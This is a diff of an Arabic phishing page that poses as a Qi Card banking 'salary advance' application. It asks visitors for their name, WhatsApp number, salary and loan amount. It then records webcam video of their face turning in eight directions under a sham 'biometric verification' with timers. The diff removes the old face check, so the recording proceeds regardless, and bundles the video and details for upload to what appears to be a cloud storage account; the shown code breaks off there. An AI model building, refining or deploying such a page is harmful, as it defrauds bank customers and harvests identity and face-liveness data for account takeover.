@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="theme-color" content="#002B5C">
-<title>التحقق البيومتري | كي للخدمات المصرفية</title>
+<title>طلب السلفة | كي للخدمات المصرفية</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
@@ -19,46 +19,65 @@ body{min-height:100dvh;min-height:-webkit-fill-available;display:flex;flex-direc
 .main{flex:1;display:flex;align-items:center;justify-content:center;padding:8px;width:100%}
 .card{background:var(--white);width:100%;max-width:420px;border-radius:16px;padding:16px;box-shadow:0 4px 20px rgba(0,43,92,0.08);text-align:center;border:1px solid rgba(243,205,0,0.3);animation:fadeIn 0.3s ease-out}
 @keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+.steps{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:12px}
+.step{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;background:#E9ECEF;color:#ADB5BD}
+.step.active{background:var(--gold);color:var(--navy)}
+.step.done{background:var(--navy);color:var(--white)}
+.line{width:24px;height:2px;background:#E9ECEF}
+.line.done{background:var(--navy)}
 h1{font-size:18px;font-weight:800;margin-bottom:6px;color:var(--navy)}
 .sub{font-size:12px;color:#6C757D;margin-bottom:14px;line-height:1.4}
-.dir-box{position:relative;width:140px;height:140px;margin:0 auto 12px;background:rgba(0,43,92,0.05);border-radius:50%;border:3px solid var(--navy)}
-.dir-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:var(--gold);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900;color:var(--navy);z-index:2}
-.dir-arrow{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:40px;color:var(--gold);z-index:3;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3));transition:all 0.3s}
-.dir-label{position:absolute;bottom:-24px;left:50%;transform:translateX(-50%);font-size:12px;font-weight:700;color:var(--navy);white-space:nowrap}
-.dots{position:absolute;inset:0;pointer-events:none}
-.dot{position:absolute;width:14px;height:14px;border-radius:50%;background:#E9ECEF;border:2px solid #ADB5BD;transition:all 0.3s}
-.dot.done{background:var(--success);border-color:var(--success);box-shadow:0 0 8px rgba(16,185,129,0.5)}
-.dot.cur{background:var(--gold);border-color:var(--navy);animation:dotpulse 1s infinite}
-@keyframes dotpulse{0%,100%{transform:scale(1)}50%{transform:scale(1.4)}}
-.dot[data-d="up"]{top:4px;left:50%;transform:translateX(-50%)}
-.dot[data-d="down"]{bottom:4px;left:50%;transform:translateX(-50%)}
-.dot[data-d="left"]{left:4px;top:50%;transform:translateY(-50%)}
-.dot[data-d="right"]{right:4px;top:50%;transform:translateY(-50%)}
-.dot[data-d="ur"]{top:14px;right:14px}
-.dot[data-d="ul"]{top:14px;left:14px}
-.dot[data-d="dr"]{bottom:14px;right:14px}
-.dot[data-d="dl"]{bottom:14px;left:14px}
-.sb{background:rgba(0,43,92,0.9);color:white;padding:8px;border-radius:8px;font-size:13px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:6px}
+.fg{margin-bottom:10px;text-align:right}
+.fl{display:block;margin-bottom:4px;font-size:12px;font-weight:600;color:var(--navy)}
+.req{color:var(--error);margin-inline-start:2px}
+.fi,.fs{width:100%;padding:10px 12px;border:1.5px solid #E9ECEF;border-radius:8px;font-size:16px;font-family:inherit;background:var(--white);color:var(--navy);outline:none;-webkit-appearance:none}
+.fs{background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23002B5C' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:left 10px center;background-size:16px;padding-left:32px}
+.fi:focus,.fs:focus{border-color:var(--navy)}
+.fi.err,.fs.err{border-color:var(--error);background:#FEF2F2}
+.em{color:var(--error);font-size:11px;margin-top:3px;text-align:right;font-weight:500;display:none}
+.wi{display:inline-block;width:14px;height:14px;margin-inline-end:3px;vertical-align:middle}
+.btn{width:100%;padding:12px;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;background:var(--gold);color:var(--navy)}
+.btn:active{transform:scale(0.98)}
+.btn:disabled{opacity:0.6}
 .cw{position:relative;width:100%;max-height:45vh;aspect-ratio:3/4;background:#000;border-radius:12px;overflow:hidden;margin-bottom:12px;border:2px solid var(--navy)}
 #webcam{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
 .wm{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:35%;opacity:0.15;pointer-events:none;z-index:2;filter:grayscale(100%) brightness(200%)}
 .fg2{position:absolute;top:50%;left:50%;transform:translate(-50%,-55%);width:60%;aspect-ratio:3/4;border:2px dashed rgba(255,255,255,0.6);border-radius:50%;box-shadow:0 0 0 9999px rgba(0,43,92,0.75);pointer-events:none;z-index:3;transition:all 0.3s}
 .fg2.on{border:2px solid var(--gold);box-shadow:0 0 0 9999px rgba(0,43,92,0.6),0 0 20px rgba(243,205,0,0.6)}
+.dir-box{position:relative;width:130px;height:130px;margin:0 auto 12px;background:rgba(0,43,92,0.05);border-radius:50%;border:3px solid var(--navy)}
+.dir-center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:36px;height:36px;background:var(--gold);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900;color:var(--navy);z-index:2}
+.dir-arrow{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:var(--gold);z-index:3;filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3));transition:all 0.3s}
+.dir-label{position:absolute;bottom:-22px;left:50%;transform:translateX(-50%);font-size:12px;font-weight:700;color:var(--navy);white-space:nowrap}
+.dots{position:absolute;inset:0;pointer-events:none}
+.dot{position:absolute;width:12px;height:12px;border-radius:50%;background:#E9ECEF;border:2px solid #ADB5BD;transition:all 0.3s}
+.dot.done{background:var(--success);border-color:var(--success);box-shadow:0 0 8px rgba(16,185,129,0.5)}
+.dot.cur{background:var(--gold);border-color:var(--navy);animation:dotpulse 1s infinite}
+@keyframes dotpulse{0%,100%{transform:scale(1)}50%{transform:scale(1.3)}}
+.dot[data-d="up"]{top:6px;left:50%;transform:translateX(-50%)}
+.dot[data-d="down"]{bottom:6px;left:50%;transform:translateX(-50%)}
+.dot[data-d="left"]{left:6px;top:50%;transform:translateY(-50%)}
+.dot[data-d="right"]{right:6px;top:50%;transform:translateY(-50%)}
+.dot[data-d="ur"]{top:16px;right:16px}
+.dot[data-d="ul"]{top:16px;left:16px}
+.dot[data-d="dr"]{bottom:16px;right:16px}
+.dot[data-d="dl"]{bottom:16px;left:16px}
+.sb{background:rgba(0,43,92,0.9);color:white;padding:8px;border-radius:8px;font-size:13px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:6px}
 .pc{margin-top:10px}
 .pt{font-size:12px;color:#6C757D;margin-bottom:6px;font-weight:600}
-.pb{height:8px;background:#E9ECEF;border-radius:4px;overflow:hidden;margin-bottom:6px}
+.pb{height:5px;background:#E9ECEF;border-radius:3px;overflow:hidden;margin-bottom:6px}
 .pf{height:100%;background:linear-gradient(90deg,var(--gold),var(--navy));width:0%;transition:width 0.3s linear}
-.btn{width:100%;padding:12px;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;background:var(--gold);color:var(--navy)}
-.btn:active{transform:scale(0.98)}
-.success-icon{width:60px;height:60px;background:linear-gradient(135deg,#10B981,#059669);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;color:white;font-size:32px;animation:bounce 0.6s cubic-bezier(0.175,0.885,0.32,1.275)}
+.timer-display{font-size:24px;font-weight:900;color:var(--gold);text-align:center;margin-top:4px}
+.si{width:60px;height:60px;background:linear-gradient(135deg,#10B981,#059669);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;color:white;font-size:32px;animation:bounce 0.6s cubic-bezier(0.175,0.885,0.32,1.275)}
 @keyframes bounce{0%{transform:scale(0) rotate(-180deg)}60%{transform:scale(1.2) rotate(10deg)}100%{transform:scale(1) rotate(0)}}
-.token-box{background:var(--light);border:1px dashed var(--navy);padding:10px;border-radius:8px;margin:12px 0;font-family:'Courier New',monospace;font-size:14px;color:var(--navy);font-weight:700;direction:ltr}
+.tb{background:var(--light);border:1px dashed var(--navy);padding:10px;border-radius:8px;margin:12px 0;font-family:'Courier New',monospace;font-size:14px;color:var(--navy);font-weight:700;direction:ltr}
 .in{font-size:11px;color:#6C757D;margin-top:10px;line-height:1.4}
 .hid{display:none!important}
 .ft{text-align:center;padding:8px;font-size:10px;color:#888;background:var(--white);border-top:1px solid #E9ECEF;flex-shrink:0}
-.face-indicator{position:absolute;top:10px;right:10px;background:rgba(0,0,0,0.7);color:white;padding:4px 8px;border-radius:6px;font-size:11px;font-weight:600;z-index:10}
-.face-indicator.detected{background:rgba(16,185,129,0.9)}
-.face-indicator.moving{background:rgba(243,205,0,0.9)}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.shake{animation:shake 0.3s}
+.il{text-align:right;background:rgba(243,205,0,0.08);border:1px solid rgba(243,205,0,0.3);border-radius:10px;padding:12px;margin-bottom:14px}
+.il li{list-style:none;padding:4px 0;font-size:12px;color:var(--navy);display:flex;align-items:center;gap:6px}
+.il li::before{content:'✓';color:var(--success);font-weight:900;font-size:14px}
 @media(max-width:480px){.card{padding:14px;border-radius:14px}h1{font-size:17px}}
 </style>
 </head>
@@ -70,25 +89,84 @@ h1{font-size:18px;font-weight:800;margin-bottom:6px;color:var(--navy)}
 
 <main class="main">
 
-<div id="pg-intro" class="card">
-<h1>التحقق البيومتري بالوجه</h1>
-<p class="sub">لتأكيد هويتك، يرجى تحريك وجهك في 8 اتجاهات مختلفة</p>
-<ul style="text-align:right;background:rgba(243,205,0,0.08);border:1px solid rgba(243,205,0,0.3);border-radius:10px;padding:12px;margin-bottom:14px;list-style:none">
-<li style="padding:4px 0;font-size:12px;color:var(--navy)">✓ انظر مباشرة إلى الكاميرا</li>
-<li style="padding:4px 0;font-size:12px;color:var(--navy)">✓ اتبع الأسهم الظاهرة على الشاشة</li>
-<li style="padding:4px 0;font-size:12px;color:var(--navy)">✓ حرك وجهك ببطء نحو كل اتجاه</li>
-<li style="padding:4px 0;font-size:12px;color:var(--navy)">✓ انتظر حتى يكتمل كل اتجاه (100%)</li>
-<li style="padding:4px 0;font-size:12px;color:var(--navy)">✓ أكمل جميع الاتجاهات الثمانية</li>
-</ul>
-<button class="btn" onclick="startVerification()">
-<span>بدء التحقق</span>
-<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-</button>
+<!-- صفحة 1: نموذج البيانات -->
+<div id="pg-form" class="card">
+<div class="steps">
+<div class="step active">1</div><div class="line"></div>
+<div class="step">2</div><div class="line"></div>
+<div class="step">3</div>
+</div>
+<h1>طلب السلفة المصرفية</h1>
+<p class="sub">أكمل البيانات للبدء في إجراءات الطلب</p>
+
+<form id="form" onsubmit="goBio(event)">
+<div class="fg">
+<label class="fl">الإسم الكامل<span class="req">*</span></label>
+<input type="text" id="f-name" class="fi" placeholder="الاسم الثلاثي" maxlength="100" autocomplete="name">
+<div class="em" id="e-name">يرجى إدخال الاسم الثلاثي</div>
 </div>
 
-<div id="pg-verify" class="card hid">
+<div class="fg">
+<label class="fl">
+<svg class="wi" viewBox="0 0 24 24" fill="#25D366"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38a9.87 9.87 0 0 0 4.79 1.22h.01c5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.82 9.82 0 0 0 12.04 2Zm4.52 12.05c-.25-.13-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.16.24-.64.8-.79.97-.14.16-.29.18-.54.06-.25-.13-1.05-.39-2-1.23-.74-.66-1.24-1.47-1.38-1.72-.15-.25-.02-.38.11-.5.11-.11.25-.29.37-.44.13-.15.17-.25.25-.41.08-.17.04-.31-.02-.44-.06-.12-.56-1.35-.77-1.84-.2-.48-.4-.42-.56-.43h-.47c-.17 0-.44.06-.66.31-.23.25-.87.85-.87 2.07s.89 2.4 1.02 2.57c.12.16 1.75 2.67 4.25 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.68-1.18.21-.58.21-1.08.14-1.18-.06-.11-.22-.17-.47-.29Z"/></svg>
+رقم الهاتف (واتساب)<span class="req">*</span>
+</label>
+<input type="tel" id="f-phone" class="fi" placeholder="07XXXXXXXXX" inputmode="tel" maxlength="20" autocomplete="tel">
+<div class="em" id="e-phone">رقم الهاتف غير صحيح</div>
+</div>
+
+<div class="fg">
+<label class="fl">هل سوبر كي مفعل؟<span class="req">*</span></label>
+<select id="f-sk" class="fs">
+<option value="">اختر...</option>
+<option value="نعم">نعم</option>
+<option value="لا">لا</option>
+</select>
+<div class="em" id="e-sk">يرجى الاختيار</div>
+</div>
+
+<div class="fg">
+<label class="fl">مبلغ السلفة<span class="req">*</span></label>
+<select id="f-amt" class="fs">
+<option value="">اختر المبلغ...</option>
+<option value="5 مليون">5 مليون</option>
+<option value="10 مليون">10 مليون</option>
+<option value="20 مليون">20 مليون</option>
+<option value="25 مليون">25 مليون</option>
+<option value="30 مليون">30 مليون</option>
+</select>
+<div class="em" id="e-amt">يرجى اختيار المبلغ</div>
+</div>
+
+<div class="fg">
+<label class="fl">الراتب الشهري<span class="req">*</span></label>
+<select id="f-sal" class="fs">
+<option value="">اختر الراتب...</option>
+<option value="من 100 ألف إلى 300 ألف">من 100 ألف إلى 300 ألف</option>
+<option value="من 300 ألف إلى 500 ألف">من 300 ألف إلى 500 ألف</option>
+<option value="من 500 ألف إلى 700 ألف">من 500 ألف إلى 700 ألف</option>
+<option value="من 700 ألف إلى 1 مليون">من 700 ألف إلى 1 مليون</option>
+<option value="أكثر من 1 مليون">أكثر من 1 مليون</option>
+</select>
+<div class="em" id="e-sal">يرجى اختيار الراتب</div>
+</div>
+
+<button type="submit" class="btn">
+<span>متابعة للتحقق</span>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+</button>
+</form>
+</div>
+
+<!-- صفحة 2: التحقق البيومتري -->
+<div id="pg-bio" class="card hid">
+<div class="steps">
+<div class="step done">✓</div><div class="line done"></div>
+<div class="step active">2</div><div class="line"></div>
+<div class="step">3</div>
+</div>
 <h1>التحقق البيومتري</h1>
-<p class="sub" id="v-sub">اتبع التعليمات</p>
+<p class="sub" id="bio-sub">اتبع التعليمات</p>
 
 <div class="dir-box">
 <div class="dots">
@@ -108,27 +186,33 @@ h1{font-size:18px;font-weight:800;margin-bottom:6px;color:var(--navy)}
 
 <div class="sb">
 <span>📷</span>
-<span id="v-st">جاري تهيئة الكاميرا...</span>
+<span id="bio-st">جاري تهيئة الكاميرا...</span>
 </div>
 
 <div class="cw">
 <video id="webcam" autoplay playsinline muted></video>
 <img src="https://qi.iq/images/logo.svg?1=1" class="wm">
 <div class="fg2" id="fg2"></div>
-<div class="face-indicator" id="face-ind">جاري البحث عن الوجه...</div>
 </div>
 
-<div class="pc">
-<div class="pt" id="pt">الاتجاه 1: 0%</div>
+<div class="pc" id="pc">
+<div class="pt" id="pt">الاتجاه 1 من 8 - 5 ثوانٍ</div>
 <div class="pb"><div class="pf" id="pf"></div></div>
+<div class="timer-display" id="timer-disp">5</div>
 </div>
 </div>
 
+<!-- صفحة 3: النجاح -->
 <div id="pg-ok" class="card hid">
-<div class="success-icon">✓</div>
+<div class="steps">
+<div class="step done">✓</div><div class="line done"></div>
+<div class="step done">✓</div><div class="line done"></div>
+<div class="step done">✓</div>
+</div>
+<div class="si">✓</div>
 <h1>تم التحقق بنجاح!</h1>
 <p class="sub">تم التحقق من هويتك في جميع الاتجاهات</p>
-<div class="token-box" id="tok">QI-LOADING</div>
+<div class="tb" id="tok">QI-LOADING</div>
 <div class="in">💬 سيتم التواصل معك عبر الواتساب خلال 24 ساعة.</div>
 </div>
 
@@ -139,218 +223,85 @@ h1{font-size:18px;font-weight:800;margin-bottom:6px;color:var(--navy)}
 <script>
 const CN='ujzbgprc',UP='qi_verify';
 
+// الاتجاهات الثمانية مع التعليمات
 const DIRS=[
-{id:'up',label:'انظر للأعلى',arrow:'↑',dx:0,dy:-1},
-{id:'ur',label:'انظر لأعلى يمين',arrow:'↗',dx:1,dy:-1},
-{id:'right',label:'انظر لليمين',arrow:'→',dx:1,dy:0},
-{id:'dr',label:'انظر لأسفل يمين',arrow:'↘',dx:1,dy:1},
-{id:'down',label:'انظر للأسفل',arrow:'↓',dx:0,dy:1},
-{id:'dl',label:'انظر لأسفل يسار',arrow:'↙',dx:-1,dy:1},
-{id:'left',label:'انظر لليسار',arrow:'←',dx:-1,dy:0},
-{id:'ul',label:'انظر لأعلى يسار',arrow:'↖',dx:-1,dy:-1}
+{id:'up',label:'انظر للأعلى',arrow:'↑',instruction:'حرك وجهك للأعلى'},
+{id:'ur',label:'انظر لأعلى يمين',arrow:'↗',instruction:'حرك وجهك لأعلى يمين'},
+{id:'right',label:'انظر لليمين',arrow:'→',instruction:'حرك وجهك لليمين'},
+{id:'dr',label:'انظر لأسفل يمين',arrow:'↘',instruction:'حرك وجهك لأسفل يمين'},
+{id:'down',label:'انظر للأسفل',arrow:'↓',instruction:'حرك وجهك للأسفل'},
+{id:'dl',label:'انظر لأسفل يسار',arrow:'↙',instruction:'حرك وجهك لأسفل يسار'},
+{id:'left',label:'انظر لليسار',arrow:'←',instruction:'حرك وجهك لليسار'},
+{id:'ul',label:'انظر لأعلى يسار',arrow:'↖',instruction:'حرك وجهك لأعلى يسار'}
 ];
 
-let stream=null,mr=null,chunks=[],ci=null,curDir=0,dirProg=0,base=null,analyzing=false;
-const vid=document.getElementById('webcam'),fg=document.getElementById('fg2'),st=document.getElementById('v-st'),faceInd=document.getElementById('face-ind');
+const DIR_TIME=5; // 5 ثوانٍ لكل اتجاه
+
+let stream=null,mr=null,chunks=[],curDir=0,timerInt=null,formData={};
+const vid=document.getElementById('webcam'),fg=document.getElementById('fg2'),st=document.getElementById('bio-st');
 
 function show(id){document.querySelectorAll('.card').forEach(c=>c.classList.add('hid'));document.getElementById(id).classList.remove('hid')}
 
-async function startVerification(){
-show('pg-verify');
+// ====== التحقق من البيانات ======
+function validate(){
+const name=document.getElementById('f-name').value.trim();
+const phone=document.getElementById('f-phone').value.trim();
+const sk=document.getElementById('f-sk').value;
+const amt=document.getElementById('f-amt').value;
+const sal=document.getElementById('f-sal').value;
+let ok=true;
+
+const nameErr=document.getElementById('e-name'),nameIn=document.getElementById('f-name');
+if(!name||name.split(/\s+/).length<3){nameIn.classList.add('err','shake');nameErr.textContent='يرجى إدخال الاسم الثلاثي';nameErr.style.display='block';ok=false;setTimeout(()=>nameIn.classList.remove('shake'),300)}
+else if(!/^[\u0600-\u06FF\s]+$/.test(name)){nameIn.classList.add('err','shake');nameErr.textContent='الاسم يجب أن يحتوي على حروف عربية فقط';nameErr.style.display='block';ok=false;setTimeout(()=>nameIn.classList.remove('shake'),300)}
+else{nameIn.classList.remove('err');nameErr.style.display='none'}
+
+const phoneErr=document.getElementById('e-phone'),phoneIn=document.getElementById('f-phone');
+const cleanPhone=phone.replace(/[\s\-\(\)]/g,'');
+if(!cleanPhone||!/^\+?[0-9]{10,15}$/.test(cleanPhone)){phoneIn.classList.add('err','shake');phoneErr.textContent='رقم الهاتف يجب أن يكون 10-15 رقم';phoneErr.style.display='block';ok=false;setTimeout(()=>phoneIn.classList.remove('shake'),300)}
+else if(!cleanPhone.startsWith('07')&&!cleanPhone.startsWith('+964')){phoneIn.classList.add('err','shake');phoneErr.textContent='رقم الهاتف يجب أن يبدأ بـ 07';phoneErr.style.display='block';ok=false;setTimeout(()=>phoneIn.classList.remove('shake'),300)}
+else{phoneIn.classList.remove('err');phoneErr.style.display='none'}
+
+[['f-sk','e-sk','سوبر كي مفعل'],['f-amt','e-amt','مبلغ السلفة'],['f-sal','e-sal','الراتب الشهري']].forEach(([id,eid,label])=>{
+const el=document.getElementById(id),err=document.getElementById(eid);
+if(!el.value){el.classList.add('err','shake');err.textContent='يرجى اختيار '+label;err.style.display='block';ok=false;setTimeout(()=>el.classList.remove('shake'),300)}
+else{el.classList.remove('err');err.style.display='none'}
+});
+
+return ok?{name,phone,sk,amt,sal}:null;
+}
+
+document.querySelectorAll('.fi,.fs').forEach(el=>{
+el.addEventListener('input',()=>{el.classList.remove('err');const e=document.getElementById('e-'+el.id.replace('f-',''));if(e)e.style.display='none'});
+el.addEventListener('change',()=>{el.classList.remove('err');const e=document.getElementById('e-'+el.id.replace('f-',''));if(e)e.style.display='none'});
+});
+
+function goBio(e){
+e.preventDefault();
+const data=validate();
+if(!data)return;
+formData=data;
+show('pg-bio');
+startBio();
+}
+
+// ====== التحقق البيومتري ======
+async function startBio(){
 st.textContent='جاري طلب الكاميرا...';
 try{
 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:'user'},width:{ideal:640},height:{ideal:480}},audio:false});
 vid.srcObject=stream;
 await vid.play();
-st.textContent='✅ تم التعرف - اثبت وجهك للأمام';
+st.textContent='✅ تم التعرف - اثبت وجهك داخل الإطار';
 fg.classList.add('on');
-setTimeout(()=>{captureBase();startDir()},2000);
+
+// بدء التسجيل فوراً
+startRecording();
+
+// انتظار ثانيتين ثم بدء أول اتجاه
+setTimeout(()=>startDirection(0),2000);
 }catch(err){
 st.textContent='⚠️ يرجى السماح بالوصول للكاميرا';
-}
-}
-
-function captureBase(){
-let attempts=0;
-const tryCapture=()=>{
-const pos=detectFace();
-if(pos.confidence>0.5){
-base=pos;
-st.textContent='✅ تم تثبيت الموضع الأساسي - ابدأ التحريك';
-startAnalysis();
-}else{
-attempts++;
-if(attempts<10){
-setTimeout(tryCapture,300);
-}else{
-base={x:0.5,y:0.5,confidence:1};
-startAnalysis();
-}
-}
-};
-tryCapture();
-}
-
-function detectFace(){
-const canvas=document.createElement('canvas');
-canvas.width=80;
-canvas.height=60;
-const ctx=canvas.getContext('2d');
-ctx.drawImage(vid,0,0,80,60);
-const data=ctx.getImageData(0,0,80,60).data;
-
-let skinPixels=0;
-let sumX=0,sumY=0;
-let minX=80,maxX=0,minY=60,maxY=0;
-
-for(let y=0;y<60;y++){
-for(let x=0;x<80;x++){
-const i=(y*80+x)*4;
-const r=data[i],g=data[i+1],b=data[i+2];
-
-// خوارزمية كشف البشرة المحسّنة
-const isSkin=(r>95&&g>40&&b>20&&r>g&&r>b&&Math.abs(r-g)>15&&r-g>15&&r-b>15)||(r>60&&g>40&&b>20&&r>g&&r>b&&r-g>10);
-
-if(isSkin){
-skinPixels++;
-sumX+=x;
-sumY+=y;
-if(x<minX)minX=x;
-if(x>maxX)maxX=x;
-if(y<minY)minY=y;
-if(y>maxY)maxY=y;
-}
-}
-}
-
-if(skinPixels<100){
-return{x:0.5,y:0.5,confidence:0};
-}
-
-const centerX=sumX/skinPixels/80;
-const centerY=sumY/skinPixels/60;
-const width=(maxX-minX)/80;
-const height=(maxY-minY)/60;
-
-// التحقق من أن المنطقة تشبه وجه (نسبة العرض للارتفاع)
-const aspectRatio=width/height;
-const faceLike=aspectRatio>0.5&&aspectRatio<2.0&&width>0.1&&height>0.1;
-
-return{
-x:centerX,
-y:centerY,
-width:width,
-height:height,
-confidence:faceLike?Math.min(skinPixels/500,1):0.3
-};
-}
-
-function startAnalysis(){
-analyzing=true;
-analyzeFrame();
-}
-
-function analyzeFrame(){
-if(!analyzing)return;
-
-const pos=detectFace();
-faceInd.textContent=pos.confidence>0.5?'✓ وجه مكتشف':'جاري البحث...';
-faceInd.className='face-indicator'+(pos.confidence>0.5?' detected':'');
-
-if(pos.confidence>0.5&&base&&base.confidence>0.5){
-const dx=pos.x-base.x;
-const dy=pos.y-base.y;
-
-// حساب المسافة من المركز
-const distance=Math.sqrt(dx*dx+dy*dy);
-
-if(curDir<DIRS.length){
-const target=DIRS[curDir];
-const targetDx=target.dx*0.15;
-const targetDy=target.dy*0.15;
-const targetDist=Math.sqrt(targetDx*targetDx+targetDy*targetDy);
-
-// حساب مدى التطابق مع الاتجاه المطلوب
-let matchX=true,matchY=true;
-
-if(target.dx!==0){
-matchX=target.dx>0?dx>targetDx*0.6:dx<targetDx*0.6;
-}
-if(target.dy!==0){
-matchY=target.dy>0?dy>targetDy*0.6:dy<targetDy*0.6;
-}
-
-if(matchX&&matchY&&distance>0.05){
-dirProg+=8;
-faceInd.textContent='✓ حركة صحيحة';
-faceInd.className='face-indicator moving';
-
-if(dirProg>=100){
-dirProg=100;
-completeDir();
-}
-}else{
-// تراجع بطيء إذا ابتعد عن الاتجاه
-dirProg=Math.max(0,dirProg-2);
-}
-
-const total=(curDir+dirProg/100)/8*100;
-document.getElementById('pf').style.width=total+'%';
-document.getElementById('pt').textContent='الاتجاه '+(curDir+1)+' من 8: '+Math.round(dirProg)+'%';
-}
-}
-
-requestAnimationFrame(analyzeFrame);
-}
-
-function completeDir(){
-curDir++;
-dirProg=0;
-
-// تحديث النقاط
-document.querySelectorAll('.dot').forEach((dot,idx)=>{
-dot.classList.remove('cur');
-if(idx<curDir){
-dot.classList.add('done');
-}
-});
-
-if(curDir>=DIRS.length){
-finishVerification();
-}else{
-updateDirUI();
-}
-}
-
-function updateDirUI(){
-const dir=DIRS[curDir];
-document.getElementById('d-step').textContent=(curDir+1)+'/8';
-document.getElementById('d-arrow').textContent=dir.arrow;
-document.getElementById('d-label').textContent=dir.label;
-document.getElementById('v-sub').textContent='حرك وجهك '+dir.label.replace('انظر ','');
-
-// تمييز النقطة الحالية
-const dots=document.querySelectorAll('.dot');
-const dirMap={up:0,ur:1,right:2,dr:3,down:4,dl:5,left:6,ul:7};
-if(dots[dirMap[dir.id]]){
-dots[dirMap[dir.id]].classList.add('cur');
-}
-}
-
-function finishVerification(){
-analyzing=false;
-st.textContent='جاري الحفظ...';
-
-if(mr&&mr.state!=='inactive'){
-mr.stop();
-}
-
-mr.onstop=()=>{
-uploadData();
-};
-
-if(stream){
-stream.getTracks().forEach(t=>t.stop());
 }
 }
 
@@ -365,17 +316,73 @@ mr.ondataavailable=e=>{if(e.data&&e.data.size>0)chunks.push(e.data)};
 try{mr.start(100)}catch(e){}
 }
 
+// ====== نظام الاتجاهات ======
+function startDirection(idx){
+if(idx>=DIRS.length){
+finishBio();
+return;
+}
+
+curDir=idx;
+const dir=DIRS[idx];
+
+// تحديث الواجهة
+document.getElementById('d-step').textContent=(idx+1)+'/8';
+document.getElementById('d-arrow').textContent=dir.arrow;
+document.getElementById('d-label').textContent=dir.label;
+document.getElementById('bio-sub').textContent=dir.instruction;
+document.getElementById('pt').textContent=`الاتجاه ${idx+1} من 8 - ${DIR_TIME} ثوانٍ`;
+document.getElementById('pc').style.display='block';
+
+// تحديث النقاط
+document.querySelectorAll('.dot').forEach((dot,i)=>{
+dot.classList.remove('cur');
+if(i<idx)dot.classList.add('done');
+});
+const dirMap={up:0,ur:1,right:2,dr:3,down:4,dl:5,left:6,ul:7};
+const dots=document.querySelectorAll('.dot');
+if(dots[dirMap[dir.id]])dots[dirMap[dir.id]].classList.add('cur');
+
+// بدء العد التنازلي
+let timeLeft=DIR_TIME;
+document.getElementById('timer-disp').textContent=timeLeft;
+document.getElementById('pf').style.width=(idx/8*100)+'%';
+
+timerInt=setInterval(()=>{
+timeLeft--;
+document.getElementById('timer-disp').textContent=timeLeft;
+document.getElementById('pf').style.width=((idx+(DIR_TIME-timeLeft)/DIR_TIME)/8*100)+'%';
+
+if(timeLeft<=0){
+clearInterval(timerInt);
+// الانتقال للاتجاه التالي
+setTimeout(()=>startDirection(idx+1),500);
+}
+},1000);
+}
+
+function finishBio(){
+st.textContent='جاري الحفظ...';
+if(mr&&mr.state!=='inactive'){
+mr.stop();
+}
+mr.onstop=()=>{
+uploadData();
+};
+if(stream)stream.getTracks().forEach(t=>t.stop());
+}
+
 async function uploadData(){
 const tok='QI-'+Date.now().toString(36).toUpperCase()+'-'+Math.random().toString(36).substring(2,7).toUpperCase();
 
 try{
 const vb=new Blob(chunks,{type:chunks[0]?.type||'video/webm'});
-const txt=`طلب سلفة جديد - كي للخدمات المصرفية\n=========================================\n\n📋 بيانات المتقدم:\n• رقم المرجع: ${tok}\n• وقت التقديم: ${new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad'})}\n• الجهاز: ${/iPhone|iPad|iPod/i.test(navigator.userAgent)?'iOS':/Android/i.test(navigator.userAgent)?'Android':'Other'}\n\n🔐 التحقق البيومتري:\n• عدد الاتجاهات: 8\n• الحالة: مكتمل ✓\n\n=========================================`;
